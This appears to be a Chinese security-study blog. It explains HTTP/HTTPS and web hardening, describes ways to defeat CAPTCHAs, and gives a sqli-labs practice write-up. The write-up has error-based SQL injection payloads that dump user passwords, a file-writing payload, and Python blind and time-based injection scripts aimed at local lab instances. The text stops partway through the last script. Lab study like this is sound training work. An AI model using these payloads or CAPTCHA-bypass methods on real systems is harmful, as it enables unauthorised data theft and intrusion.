<p>Web采用的HTTP协议采用了非常简单的请求-响应模式，从而大大简化了开发。当我们编写一个页面时，我们只需要在HTTP响应中把HTML发送出去，不需要考虑如何附带图片、视频等，浏览器如果需要请求图片和视频，它会发送另一个HTTP请求，因此，一个HTTP请求只处理一个资源。</p>
<p>HTTP协议同时具备极强的扩展性，虽然浏览器请求的是<code>http://www.sina.com.cn/</code>的首页，但是新浪在HTML中可以链入其他服务器的资源，比如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://i1.sinaimg.cn/home/2013/1008/U8455P30DT20131008135420.png"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>从而将请求压力分散到各个服务器上，并且，一个站点可以链接到其他站点，无数个站点互相链接起来，就形成了World Wide Web，简称“三达不溜”（WWW）。</p>
<h4 id="—-HTTP格式"><a href="#—-HTTP格式" class="headerlink" title="—-HTTP格式"></a>—-HTTP格式</h4><p>每个HTTP请求和响应都遵循相同的格式，一个HTTP包含Header和Body两部分，其中Body是可选的。</p>
<p>HTTP协议是一种文本协议，所以，它的格式也非常简单。HTTP GET请求的格式：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br></pre></td></tr></table></figure>

<p>每个Header一行一个，换行符是<code>\r\n</code>。</p>
<p>HTTP POST请求的格式：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>当遇到连续两个<code>\r\n</code>时，Header部分结束，后面的数据全部是Body。</p>
<p>HTTP响应的格式：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">200 OK</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>HTTP响应如果包含body，也是通过<code>\r\n\r\n</code>来分隔的。请再次注意，Body的数据类型由<code>Content-Type</code>头来确定，如果是网页，Body就是文本，如果是图片，Body就是图片的二进制数据。</p>
<p>当存在<code>Content-Encoding</code>时，Body数据是被压缩的，最常见的压缩方式是gzip，所以，看到<code>Content-Encoding: gzip</code>时，需要将Body数据先解压缩，才能得到真正的数据。压缩的目的在于减少Body的大小，加快网络传输。</p>
<h4 id="2-HTTPS的基本概念"><a href="#2-HTTPS的基本概念" class="headerlink" title="2.HTTPS的基本概念"></a>2.HTTPS的基本概念</h4><h4 id="—-原理"><a href="#—-原理" class="headerlink" title="—-原理"></a><strong>—-原理</strong></h4><p> Https：是以安全为目标的Http通道，是Http的安全版。Https的安全基础是SSL。SSL协议位于<a href="https://baike.baidu.com/item/TCP/IP协议" target="_blank" rel="noopener">TCP/IP协议</a>与各种应用层协议之间，为<a href="https://baike.baidu.com/item/数据通讯" target="_blank" rel="noopener">数据通讯</a>提供安全支持。SSL协议可分为两层：SSL记录协议（SSL Record Protocol），它建立在可靠的传输协议（如TCP）之上，为高层协议提供<a href="https://baike.baidu.com/item/数据封装" target="_blank" rel="noopener">数据封装</a>、压缩、加密等基本功能的支持。SSL握手协议（SSL Handshake Protocol），它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>
<p><strong>Https设计目标：</strong></p>
<p>(1)数据保密性：保证数据内容在传输的过程中不会被第三方查看。就像快递员传递包裹一样，都进行了封装，别人无法获知里面装了什么 。</p>
<p>(2)数据完整性：及时发现被第三方篡改的传输内容。就像快递员虽然不知道包裹里装了什么东西，但他有可能中途掉包，数据完整性就是指如果被掉包，我们能轻松发现并拒收 。</p>
<p>(3)身份校验安全性：保证数据到达用户期望的目的地。就像我们邮寄包裹时，虽然是一个封装好的未掉包的包裹，但必须确定这个包裹不会送错地方，通过身份校验来确保送对了地方 。</p>
<p><strong>Https原理：</strong></p>
<p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
<h4 id="3-HTTP与HTTPS的区别"><a href="#3-HTTP与HTTPS的区别" class="headerlink" title="3.HTTP与HTTPS的区别"></a><strong>3.HTTP与HTTPS的区别</strong></h4><p>1、<strong>https协议需要到CA</strong> （Certificate Authority，证书颁发机构）申请证书，一般免费证书较少，因而需要一定费用。(原来网易官网是http，而网易邮箱是https。)</p>
<p>2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。</p>
<p>3、http和https使用的是完全不同的连接方式，用的端口也不一样，<strong>前者是80，后者是443</strong>。</p>
<p>4、http的连接很简单，是无状态的。Https协议是由SSL+Http协议构建的可进行<strong>加密传输、身份认证</strong>的网络协议，比http协议安全。(<strong>无状态的意思是其数据包的发送、传输和接收都是相互独立的</strong>。无连接的意思是指通信双方都不长久的维持对方的任何信息。)</p>
<h4 id="—-HTTPS的缺点（对比优点）"><a href="#—-HTTPS的缺点（对比优点）" class="headerlink" title="—-HTTPS的缺点（对比优点）"></a><strong>—-HTTPS的缺点（对比优点）</strong></h4><p>1、Https协议握手阶段比较费时，会使页面的加载时间延长。</p>
<p>2、Https连接缓存不如Http高效，会增加数据开销，甚至已有的安全措施也会因此而受到影响。</p>
<p>3、<strong>Https协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持</strong>等方面几乎<strong>起不到什么作用</strong>。</p>
<p>4、<strong>SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名</strong>，IPv4资源不可能支撑这个消耗。</p>
<p>5、成本增加。部署 Https后，因为 Https协议的工作要增加额外的计算资源消耗，例如 <strong>SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本</strong>。</p>
<p>6、Https协议的<strong>加密范围也比较有限</strong>。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。</p>
<h4 id="—-HTTP1-1版本新特性"><a href="#—-HTTP1-1版本新特性" class="headerlink" title="—-HTTP1.1版本新特性"></a>—-HTTP1.1版本新特性</h4><p>a、默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</p>
<p>b、管线化，客户端<strong>可以同时发出多个HTTP请求</strong>，而不用一个个等待响应</p>
<p>c、<strong>断点续传原理</strong></p>
<h4 id="—-HTTP的缺点与HTTPS"><a href="#—-HTTP的缺点与HTTPS" class="headerlink" title="—-HTTP的缺点与HTTPS"></a>—-HTTP的缺点与HTTPS</h4><p>a、通信使用明文不加密，内容可能被窃听<br>b、不验证通信方身份，可能遭到伪装<br>c、无法验证报文完整性，可能被篡改</p>
<h3 id="web服务器端安全保护措施："><a href="#web服务器端安全保护措施：" class="headerlink" title="web服务器端安全保护措施："></a><strong>web服务器端安全保护措施：</strong></h3><p>1.更改服务器远程端口，默认端口为80，相对来讲不太安全，建议改为随机的5位数端口。<br>2.设置防火墙并关闭不需要的服务和端口。<br>3.定时为数据进行备份。<br>4.把密码设置的复杂一点（防止黑客暴力破解）<br>5.修补已知的漏洞(即时打补丁)<br>6.可以上传的目录不给执行权限，可以执行的目录不给上传权限(防止入侵者通过上传获得webshell)<br>7.降低数据库连接帐户SA的权限，使用public最安全，这样入侵者只能通过猜解用户名和密码来获得webshell</p>
<p>禁止系统文件被非法修改、禁止非法提权操作、禁止恶意代码执行、</p>
<p>禁止加载没有数字签名的驱动、优化系统配置及服务等</p>
<h3 id="web浏览器端采取安全措施"><a href="#web浏览器端采取安全措施" class="headerlink" title="web浏览器端采取安全措施"></a><strong>web浏览器端采取安全措施</strong></h3><p><strong>浏览器的安全机制包括 网页安全模型 和 沙箱模型</strong></p>
<p><strong>1.开启同源策略</strong></p>
<p><strong>2.开启CSP策略</strong></p>
<p>以白名单的形式配置可信任的内容来源在网页中,能够使白名单中的内容正常执行(包含Js,CSS, Image等等)而非白名单的内容无法正常执行,从而减少跨站脚本攻击(XSS)当然,也能够减少运营商劫持的内容注入攻击</p>
<p><strong>3.创建沙箱模型</strong></p>
<p>而沙箱模型则是利用了 Chromium 实现的，利用 代理进程 来创建独立的环境让 目标进程 在当中安全运行。</p>
<p><strong>4.加强cookie防护</strong></p>
<p>定期清理cookie，不在cookie中存放敏感信息，<strong>使用session和cookie双重验证</strong>，增加登录随机验证码，</p>
<p>设置HttpOnly, 如果设置该属性，客户端javascript无法获取Cookie的值</p>
<p><strong>5.安装补丁及配置安全设置</strong></p>
<p>禁止javascript脚本、ActiveX的运行</p>
<p><strong>6.使用安全通信协议</strong></p>
<p>使用HTTPS协议进行通信，保证数据传输的安全。</p>
<h2 id="网页验证码技术有哪几种，特点，怎么攻破？"><a href="#网页验证码技术有哪几种，特点，怎么攻破？" class="headerlink" title="网页验证码技术有哪几种，特点，怎么攻破？"></a><strong>网页验证码技术有哪几种，特点，怎么攻破？</strong></h2><p>总的来讲，可以大致划分为三类：</p>
<p><strong>1.字符型验证码：**</strong>常见的数字字母混合验证**</p>
<p><strong>2.图片型验证码：滑动验证码、识别图片物体型、旋转图片型、点触验证码</strong></p>
<p><strong>3.智能型：计算题验证码、语音验证码、短信验证码</strong></p>
<p>特点：</p>
<p><strong>字符型验证码：由各种复杂的字母数字组合而成，且验证码背景有线条干扰或大量小点分布</strong></p>
<p>对于这类验证码，一般的步骤是，先爬取验证码图片到本地，随后对验证码进行识别，识别验证码一般采用OCR技术，即字符识别技术，为了提高识别的准确度，我们会先对图片进行灰度化，再进行二值化，这样识别的准确度会大大提高。也可利用第三方平台的接口，进行破解。</p>
<p><strong>图片型验证码：像图片识别类的验证码的特点主要是复杂，机器辨识度低，机器可替代性弱。</strong></p>
<p>但是现在一样可以做到攻破这类验证码，比如滑动验证码，将背景图、滑块图保存到本地，对比两张图片的位置信息，然后确度滑块位置，利用selenium模块下的函数，模拟点击滑块进行滑动，即可绕过。</p>
<p><strong>智能型验证码：特点主要在于难度高，机器识别困难。</strong></p>
<p>对于这一类可以利用cookie登录，利用cookie的特性：cookie会保持较长的时间，来避免用户频繁登录。</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-windows安全分析" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/29/windows%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/"
    >windows安全分析</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/29/windows%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2020-05-29T08:02:53.000Z" itemprop="datePublished">2020-05-29</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h3 id="票据传递攻击分析与防范"><a href="#票据传递攻击分析与防范" class="headerlink" title="票据传递攻击分析与防范"></a><strong>票据传递攻击分析与防范</strong></h3>
      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-sqli-labs" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/19/sqli-labs/"
    >sqli-labs</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/19/sqli-labs/" class="article-date">
  <time datetime="2020-05-19T03:57:08.000Z" itemprop="datePublished">2020-05-19</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a><strong>Less-5</strong></h3><p>知识点：</p>
<p>这题可采用报错注入，updatexml（1，xxx，1） 或者 extractvalue（1，x）</p>
<p>extractvalue(目标xml文档，xml路径)</p>
<p>updatexml(目标xml文档，xml路径，更新的内容)</p>
<p>group_concat():可将相同行的字段整合在一起</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爆库</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1                                      </span><br><span class="line"></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆列</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(0x7e,column_name,0x7e) from information_schema.columns where table_name='users') ,0x7e)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(id,0x7e,username,0x7e,password)from users),1) and '1</span><br><span class="line"><span class="comment">#回显不全，可改为concat---limit 0,1 进行逐个查询</span></span><br><span class="line">?id=1' and updatexml(1,(select concat(id,0x7e,username,0x7e,password) from users limit 4,1),1) and '1</span><br></pre></td></tr></table></figure>



<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-6</strong></h3><p>和上一关一样，只不过把单引号变成双引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)  and &quot;1</span><br></pre></td></tr></table></figure>



<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a><strong>Less-7</strong></h3><p>这里用了双括号括起来，如 $sql=”SELECT * FROM users WHERE id=((‘$id’))”  LIMIT 0,1”;</p>
<p>所以构造语句 ? id =1 ‘ ))  –+  顺利通过验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;var&#x2F;www&#x2F;sqli-labs&#x2F;Less-7&#x2F;uuu.txt&quot; --+</span><br></pre></td></tr></table></figure>



<p>{0}代表数据库的第几位<br>{1}代表acsii码的数值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url_template = <span class="string">"http://127.0.0.1:8080/Less-8/?id=1' and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23"</span></span><br><span class="line">    chars = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(i,char_ascii) <span class="comment">#分别对应url的&#123;0&#125;、&#123;1&#125;</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            length = len(response.text) </span><br><span class="line">            <span class="comment">#返回的长度只有706和722</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">706</span>:</span><br><span class="line">                result += char</span><br><span class="line">                print(length,char,char_ascii)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br><span class="line">get_db_name()</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">722</span> s <span class="number">115</span></span><br><span class="line"><span class="number">722</span> e <span class="number">101</span></span><br><span class="line"><span class="number">722</span> c <span class="number">99</span></span><br><span class="line"><span class="number">722</span> u <span class="number">117</span></span><br><span class="line"><span class="number">722</span> r <span class="number">114</span></span><br><span class="line"><span class="number">722</span> i <span class="number">105</span></span><br><span class="line"><span class="number">722</span> t <span class="number">116</span></span><br><span class="line"><span class="number">722</span> y <span class="number">121</span></span><br><span class="line">security</span><br></pre></td></tr></table></figure>



<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a><strong>Less-9</strong></h3><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a><strong>Less-10</strong></h3><p>盲注—延时注入</p>
<p>脚本编写思路：构造payload—判断注入是否成功—获取字段值—判断是否全部遍历</p>
<p>payload构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;Less-9&#x2F;?id&#x3D;&quot;</span><br><span class="line">str_top&#x3D;&quot; 1&#39; and &quot;</span><br><span class="line">str_end&#x3D;&quot; --+ &quot;</span><br><span class="line">str_sql&#x3D; select information_schema  from  information_schema.schemata</span><br><span class="line">sql_str&#x3D;&quot;if(ascii(mid(&quot;+str_sql+&quot;,&quot;+ +&quot;,1)))&quot;</span><br><span class="line">payload&#x3D;url+url_top+</span><br></pre></td></tr></table></figure>













<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">(result_index, char_index, ascii)</span>:</span></span><br><span class="line">    <span class="comment"># 系统表中数据</span></span><br><span class="line">    info_database_name = <span class="string">"information_schema"</span></span><br><span class="line">    info_table_name = <span class="string">"schemata"</span> <span class="comment"># schemata / tables / columns</span></span><br><span class="line">    info_column_name = <span class="string">"schema_name"</span> <span class="comment"># schema_name / table_name / column_name</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注入表中数据</span></span><br><span class="line">    database_name = <span class="string">"security"</span></span><br><span class="line">    table_name = <span class="string">"users"</span></span><br><span class="line">    column_name = [<span class="string">"id"</span>,<span class="string">"username"</span>,<span class="string">"password"</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 附加url</span></span><br><span class="line">    start_str = <span class="string">"1' and "</span></span><br><span class="line">    end_str = <span class="string">"--+"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接select</span></span><br><span class="line">    where_str = <span class="string">""</span></span><br><span class="line">  <span class="comment">#  where_str = " where table_schema='"+database_name+"'"+" and table_name='"+table_name+"'"</span></span><br><span class="line">    select_str = <span class="string">"select "</span>+info_column_name+<span class="string">" from "</span>+info_database_name+<span class="string">"."</span>+info_table_name+where_str+<span class="string">" limit "</span>+str(result_index)+<span class="string">",1"</span></span><br><span class="line">   <span class="comment">#select_str = "select concat_ws('-',"+column_name[0]+","+column_name[1]+","+column_name[2]+") from "+table_name+" limit "+str(result_index)+",1"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接payload</span></span><br><span class="line">    sqli_str = <span class="string">"if(ascii(mid(("</span>+select_str+<span class="string">"),"</span>+str(char_index)+<span class="string">",1))="</span>+str(ascii)+<span class="string">",sleep(0.2),0)"</span></span><br><span class="line">    payload = start_str + sqli_str + end_str</span><br><span class="line">    print(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(result_index, char_index, ascii)</span>:</span></span><br><span class="line">    <span class="comment"># 连接url</span></span><br><span class="line">    url = <span class="string">"http://localhost:8888/Less-9/?id="</span></span><br><span class="line">    exec_url = url + getPayload(result_index, char_index, ascii)</span><br><span class="line">   <span class="comment"># print(exec_url)</span></span><br><span class="line">    <span class="comment"># 检查延时</span></span><br><span class="line">    before_time = time.time()</span><br><span class="line">    requests.head(exec_url) <span class="comment"># 节约时间</span></span><br><span class="line">    after_time = time.time()</span><br><span class="line">    use_time = after_time - before_time</span><br><span class="line">    <span class="keyword">if</span> use_time &gt; <span class="number">0.1</span>:</span><br><span class="line">      <span class="comment">#  print(exec_url)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exhaustive</span><span class="params">(result_index, char_index)</span>:</span></span><br><span class="line">    <span class="comment"># ascii可显字符从32到126共95个 按可能性顺序</span></span><br><span class="line">    ascii_list = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'_'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">' '</span>,<span class="string">'!'</span>,<span class="string">'"'</span>,<span class="string">'#'</span>,<span class="string">'$'</span>,<span class="string">'%'</span>,<span class="string">'&amp;'</span>,<span class="string">'\''</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">','</span>,<span class="string">'-'</span>,<span class="string">'.'</span>,<span class="string">'/'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">':'</span>,<span class="string">';'</span>,<span class="string">'&lt;'</span>,<span class="string">'='</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'@'</span>,<span class="string">'['</span>,<span class="string">'\\'</span>,<span class="string">']'</span>,<span class="string">'^'</span>,<span class="string">'`'</span>,<span class="string">'&#123;'</span>,<span class="string">'|'</span>,<span class="string">'&#125;'</span>,<span class="string">'~'</span>]</span><br><span class="line">    <span class="keyword">for</span> ascii_char <span class="keyword">in</span> ascii_list:</span><br><span class="line">        ascii = ord(ascii_char)</span><br><span class="line">        <span class="keyword">if</span> execute(str(result_index), str(char_index+<span class="number">1</span>), str(ascii)):</span><br><span class="line">            <span class="keyword">return</span> ascii_char</span><br><span class="line">    <span class="keyword">return</span> chr(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">32</span>): <span class="comment"># 查询结果的数量</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> len <span class="keyword">in</span> range(<span class="number">32</span>): <span class="comment"># 单条查询结果的长度</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            char = exhaustive(num, len)</span><br><span class="line">            <span class="comment">#print(char)</span></span><br><span class="line">            <span class="keyword">if</span> ord(char) == <span class="number">1</span>: <span class="comment"># 单条查询结果已被遍历</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sys.stdout.write(char)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">           <span class="comment">#print(count)</span></span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">1</span>: <span class="comment"># 查询结果已被遍历</span></span><br><span class="line">            <span 